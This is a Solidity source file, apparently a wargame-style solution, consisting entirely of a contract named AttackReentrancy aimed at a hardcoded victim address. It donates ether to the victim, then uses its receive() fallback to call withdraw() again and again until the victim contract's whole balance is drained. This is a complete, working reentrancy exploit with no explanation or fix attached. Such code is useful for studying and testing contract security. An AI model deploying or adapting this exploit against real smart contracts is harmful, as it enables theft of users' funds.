pragma solidity ^0.6.0;

interface Reentrancy {
    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;

    function donate(address _to) external payable;
}

contract AttackReentrancy {
    Reentrancy victim;
    uint256 max_single_withdrawal;

    constructor() public {
        victim = Reentrancy(0xd96A563FA79A7E41A01C6651e4b0E140fB6414a2);
    }

    function attack(uint256 _amount) public payable {
        max_single_withdrawal = msg.value;
        // must have balance in attacking contract to begin withdrawals
        victim.donate.value(msg.value)(address(this));
        // begin withdrawal reentrancy
        victim.withdraw(_amount);
    }

    receive() external payable {
        // reentrancy
        if (address(victim).balance > 0) {
            // withdraw more funds
            if (address(victim).balance >= max_single_withdrawal) {
                victim.withdraw(max_single_withdrawal);
            } else {
                victim.withdraw(address(victim).balance);
            }
        }
    }
}
